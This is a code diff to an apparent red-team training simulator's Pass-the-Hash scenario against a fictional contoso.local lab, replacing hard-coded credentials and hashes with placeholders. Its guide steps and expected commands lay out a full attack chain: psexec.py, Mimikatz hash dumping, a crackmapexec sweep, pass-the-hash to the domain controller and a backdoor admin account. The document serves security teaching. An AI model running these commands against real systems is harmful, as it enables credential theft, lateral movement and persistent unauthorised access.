@@ -1,9 +1,6 @@
 /**
  * Pass-the-Hash (PtH) Attack Scenario
  *
- * This scenario simulates the Pass-the-Hash attack, where an attacker uses
- * stolen NTLM hashes to authenticate without knowing the plaintext password.
- *
  * THIS SCENARIO ASSUMES:
  * 1. `sqlservice:P@ssw0rd123!` credentials were stolen from Kerberoasting.
  * 2. `BH.zip` analysis from BloodHound revealed `sqlservice` is admin on `SQL01` (10.0.1.20).
@@ -21,8 +18,6 @@ export const pthScenario = {
       role: 'Red Team Machine'
     },
     target: {
-      // NOTE: The 'target' for this scenario is the DC (10.0.1.10),
-      // but the *first hop* is SQL01 (10.0.1.20).
       ip: '10.0.1.10',
       hostname: 'DC01.contoso.local',
       role: 'Domain Controller'
@@ -31,14 +26,13 @@ export const pthScenario = {
   },
 
   guide: {
-    overview: `**Pass-the-Hash (PtH)** is a lateral movement technique that uses stolen NTLM password hashes to authenticate to other systems.
+    overview: `**Pass-the-Hash (PtH)** is a lateral movement technique that uses stolen NTLM password hashes to authenticate.
 
 **Attack Flow:**
-1. Use compromised 'sqlservice' credentials to gain a shell on the 'SQL01' server.
+1. Use the 'sqlservice' password (from your Files tab) to get a shell on the 'SQL01' server.
 2. Dump NTLM hashes from 'SQL01' memory using Mimikatz.
-3. Identify the 'Administrator' hash.
-4. Use the 'Administrator' hash to "Pass-the-Hash" to the Domain Controller.
-5. Establish persistence on the new system.
+3. Use the newly stolen 'Administrator' hash to "Pass-the-Hash" to the Domain Controller.
+4. Establish persistence on the DC.
 
 **Why This Matters:**
 PtH bypasses password requirements. By compromising one machine, attackers can dump hashes from memory and use them to hop to other machines, escalating privileges as they go.`,
@@ -47,8 +41,8 @@ PtH bypasses password requirements. By compromising one machine, attackers can d
       {
         number: 1,
         title: 'Gain Initial Shell',
-        description: 'Use the "sqlservice" credentials (from Kerberoasting) to gain an administrative shell on the "SQL01" server (10.0.1.20) using psexec.py.',
-        command: 'psexec.py contoso.local/sqlservice:P@ssw0rd123!@10.0.1.20',
+        description: 'Use the "sqlservice" password (from your "Files" tab) to gain an administrative shell on the "SQL01" server (10.0.1.20) using psexec.py.',
+        command: 'psexec.py contoso.local/sqlservice:[PASSWORD-FROM-FILES-TAB]@10.0.1.20',
         tip: 'Our BloodHound recon showed "sqlservice" is an admin on this server.'
       },
       {
@@ -56,32 +50,32 @@ PtH bypasses password requirements. By compromising one machine, attackers can d
         title: 'Extract NTLM Hashes',
         description: 'Now that you are on the "SQL01" server, dump NTLM password hashes from memory using Mimikatz.',
         command: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"',
-        tip: 'NTLM hashes are stored in the SAM database on Windows systems'
+        tip: 'The NTLM hash for the "Administrator" account will be added to your Files.'
       },
       {
         number: 3,
         title: 'Identify Target Systems',
-        description: 'You found the local Administrator hash. Use crackmapexec to see where else this hash works.',
-        command: 'crackmapexec smb 10.0.1.0/24 -u admin -H 5f4dcc3b5aa765d61d8327deb882cf99',
-        tip: 'The hash format is LM:NTLM, but the LM hash is often a blank placeholder.'
+        description: 'You found the local Administrator hash. Use crackmapexec with this hash to see where else it works. Get the hash from your "Files" tab.',
+        command: 'crackmapexec smb 10.0.1.0/24 -u admin -H [HASH-FROM-FILES-TAB]',
+        tip: 'The hash format is just the NTLM part (the second, longer hash).'
       },
       {
         number: 4,
         title: 'Move to Domain Controller',
         description: 'The hash works on the DC (10.0.1.10)! Use psexec.py *with the hash* to authenticate and get a shell.',
-        command: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.10',
-        tip: 'The -hashes flag tells psexec.py to use the NTLM hash instead of a password.'
+        command: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:[HASH-FROM-FILES-TAB] admin@10.0.1.10',
+        tip: 'The -hashes flag takes both the LM (blank) and NTLM hashes.'
       },
       {
         number: 5,
         title: 'Establish Persistence',
-        description: 'You are now on the Domain Controller. Create a backdoor or persistence mechanism.',
+        description: 'You are now on the Domain Controller. Create a backdoor user account.',
         command: 'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
         tip: 'Persistence ensures continued access even if the original account is disabled'
       },
       {
         number: 6,
-        title: 'Escalate Privileges',
+        title: 'Lateral Movement Complete',
         description: 'You have compromised a Domain Controller and established persistence.',
         command: null,
         tip: 'From here, you could perform a DCSync attack.'
@@ -92,7 +86,7 @@ PtH bypasses password requirements. By compromising one machine, attackers can d
   steps: [
     {
       id: 1,
-      expectedCommand: 'psexec.py contoso.local/sqlservice:P@ssw0rd123!@10.0.1.20',
+      expectedCommand: 'psexec.py contoso.local/sqlservice:[LOOT:sqlservice]@10.0.1.20',
       attackerOutput: [
         '[*] Connecting to 10.0.1.20 (SQL01)...',
         '[*] Authenticating as contoso.local\\sqlservice...',
@@ -146,7 +140,7 @@ PtH bypasses password requirements. By compromising one machine, attackers can d
     },
     {
       id: 3,
-      expectedCommand: 'crackmapexec smb 10.0.1.0/24 -u admin -H 5f4dcc3b5aa765d61d8327deb882cf99',
+      expectedCommand: 'crackmapexec smb 10.0.1.0/24 -u admin -H [LOOT:admin]',
       attackerOutput: [
         '[*] Starting CrackMapExec SMB scan...',
         '[*] Scanning subnet: 10.0.1.0/24',
@@ -174,7 +168,7 @@ PtH bypasses password requirements. By compromising one machine, attackers can d
     },
     {
       id: 4,
-      expectedCommand: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.10',
+      expectedCommand: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:[LOOT:admin] admin@10.0.1.10',
       attackerOutput: [
         '[*] Connecting to 10.0.1.10 (DC01)...',
         '[*] Using Pass-the-Hash authentication',
